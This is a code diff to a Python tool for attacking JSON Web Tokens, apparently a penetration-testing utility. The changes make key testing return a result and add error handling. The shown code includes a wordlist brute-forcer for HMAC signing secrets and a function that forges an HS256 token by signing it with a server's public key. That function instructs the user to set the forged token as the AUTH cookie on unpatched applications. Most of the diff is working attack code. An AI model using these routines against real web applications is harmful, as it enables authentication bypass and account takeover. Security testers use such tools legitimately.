@@ -23,25 +23,53 @@ def usage():
 	exit(1)
 
 def checkSig(sig, contents):
-	quiet = False
 	print("Type in the key to test")
 	key = input("> ")
-	print(key)
-	testKey(key, sig, contents, headDict, quiet)
+	if(testKey(key, sig, contents, headDict)):
+		if len(key) > 25:
+			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key[0:25]))
+		else:
+			print("[+] {0} is the CORRECT key!".format(key))
+	else:
+		if len(key) > 25:
+				print("[-] {0} ...(output trimmed) is not the correct key".format(key[0:25]))
+		else:
+			print("[-] {0} is not the correct key".format(key))
 
 def checkSigKid(sig, contents,key_file):
-	quiet = False
-	print("File loaded: {0}".format(key_file))
-	testKey(key_file, sig, contents, headDict, quiet)
+	#With \n
+	withN = testKey(key_file, sig, contents, headDict)
+	#Without \n
+	withoutN = testKey(key_file.strip('\n'), sig, contents, headDict)
+	if(withN):
+		if len(key_file) > 25:
+			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key_file[0:25]))
+		else:
+			print("[+] {0} is the CORRECT key!".format(key_file))
+	elif(withoutN):
+		if len(key_file) > 25:
+			print(r"[+] {0} ...(output trimmed) is the CORRECT key! (WITH \N STRIPPED)".format(key_file[0:25]))
+		else:
+			print(r"[+] {0} is the CORRECT key! (WITH \N STRIPPED)".format(key_file.strip('\n')))
+	else:
+		if len(key_file) > 25:
+				print("[-] {0} ...(output trimmed) is not the correct key".format(key_file[0:25]))
+		else:
+			print("[-] {0} is not the correct key".format(key_file.strip('\n')))
 
 def crackSig(sig, contents,num_lines,key_list):
-	quiet = True
-	print("File loaded: {0}".format(key_list))
-	print("Testing {0} passwords".format(num_lines))
+	found = False
+	print("[+] Testing {0} passwords".format(num_lines))
 	for i in key_list:
-		testKey(i, sig, contents, headDict, quiet)
+		if(testKey(i, sig, contents, headDict)):
+			found = True
+			print("[+] {0} is the CORRECT key!".format(i))
+	if(not found):
+		print("[-] The key was not found")
+		
 
-def testKey(key, sig, contents, headDict, quiet):
+def testKey(key, sig, contents, headDict):
+	confirmed = False
 	#Must convert in bytes for the digest function
 	key_b = key.encode('utf-8')
 	contents_b = contents.encode('utf-8')
@@ -56,19 +84,8 @@ def testKey(key, sig, contents, headDict, quiet):
 		exit(1)
 	testSig = (base64.urlsafe_b64encode(testHash).decode('utf-8')).strip("=")
 	if testSig == sig:
-		if len(key) > 25:
-			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key[0:25]))
-		else:
-			print("[+] {0} is the CORRECT key!".format(key))
-		exit(1)
-	else:
-		if quiet == False:
-			if len(key) > 25:
-				print("[-] {0} ...(output trimmed) is not the correct key".format(key[0:25]))
-				#print("[-] "+key+"...(output trimmed) is not the correct key")
-			else:
-				print("[-] {0} is not the correct key".format(key))
-		return
+		confirmed = True
+	return confirmed
 
 def buildHead(alg, headDict):
 	newHead = headDict
@@ -112,14 +129,20 @@ def checkCVE(headDict, tok2):
 def checkPubKey(headDict, tok2):
 	print("\nPlease enter the Public Key filename:")
 	pubKey = input("> ")
-	key = open(pubKey).read()
-	newHead = buildHead("HS256",headDict)
-	newTok = newHead+"."+tok2
-	newHmac = hmac.new(key.encode('utf-8'),newTok.encode('utf-8'),hashlib.sha256).digest()
-	newSig = base64.urlsafe_b64encode(newHmac)
-	newSig = (newSig.decode("utf-8")).strip("=")
-	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
-	print("\n{0}.{1}".format(newTok, newSig))
+	try:
+		with open(pubKey) as filekey:
+			key = filekey.read()
+			print("File loaded: {0}".format(pubKey))
+			newHead = buildHead("HS256",headDict)
+			newTok = newHead+"."+tok2
+			newHmac = hmac.new(key.encode('utf-8'),newTok.encode('utf-8'),hashlib.sha256).digest()
+			newSig = base64.urlsafe_b64encode(newHmac)
+			newSig = (newSig.decode("utf-8")).strip("=")
+			print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
+			print("\n{0}.{1}".format(newTok, newSig))
+	except FileNotFoundError:
+		print("[-] File {0} doesn't exists".format(pubKey))
+	
 
 def tamperToken(paylDict, headDict):
 	print("\nToken header values:")
@@ -324,7 +347,10 @@ if __name__ == '__main__':
 	print("# 0: Quit                                            #")
 	print("######################################################")
 	print("\nPlease make a selection (1-6)")
-	selection = int(input("> "))
+	try:
+		selection = int(input("> "))
+	except:
+		selection = 0
 	if selection == 1:
 		checkCVE(headDict, tok2)
 	elif selection == 2:
@@ -336,6 +362,7 @@ if __name__ == '__main__':
 		file_name= input(">")
 		try:
 			with open(file_name) as f:
+				print("File loaded: {0}".format(file_name))
 				checkSigKid(sig, contents,f.read())
 		except FileNotFoundError as e:
 			print("[-] File {0} doesn't exists".format(file_name))
@@ -344,6 +371,7 @@ if __name__ == '__main__':
 		file_name= input("> ")
 		try:
 			with open(file_name) as f:
+				print("File loaded: {0}".format(file_name))
 				num_lines = sum(1 for line in open(file_name) if line.rstrip())
 				with open(file_name, "r") as f:
 					lines = f.readlines()
@@ -354,6 +382,7 @@ if __name__ == '__main__':
 	elif selection == 6:
 		tamperToken(paylDict, headDict)
 	else:
+		print("[-] Option not valid")
 		exit(1)
 	exit(1)
 
